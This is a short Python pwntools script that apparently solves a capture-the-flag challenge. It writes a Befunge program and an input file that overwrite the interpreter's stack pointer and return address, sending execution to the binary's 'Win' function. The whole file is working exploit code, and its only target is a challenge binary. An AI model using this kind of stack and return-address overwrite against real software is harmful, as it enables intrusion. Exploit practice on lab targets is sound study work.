#!/usr/bin/env python3
from pwn import *

# TODO: write user_input to file!!

def main(): 
    # generate payload
    payload = b''

    # input sp ovewrite
    payload += b'&'

    # move sp such that stack[sp] points over &sp
    for x in range(64):
        payload += b':'

    # overwrite sp
    payload += b':'

    # overwrite ret address (win addr)
    payload += b'&'

    # end
    payload += b'@'

    with open('befunge_exploit.bef','wb') as f:
        f.write(payload)

    # generate input data file
    input_data = ''
    
    # input 1: number crafted to overwrite sp to 86 
    # this gets immediately incremented to 87, and stack[87] points to return address
    input_data += str(int.from_bytes(bytes([0, 0, 0, 0, 86, 0, 0, 0]), byteorder='little'))
    input_data += '\n'

    # input 2: win function address. will overwrite ret address
    e = ELF('./befunge')
    input_data += str(e.symbols['Win'])

    with open('input_data','w') as f:
        f.write(input_data)

if __name__ == '__main__':
    main()

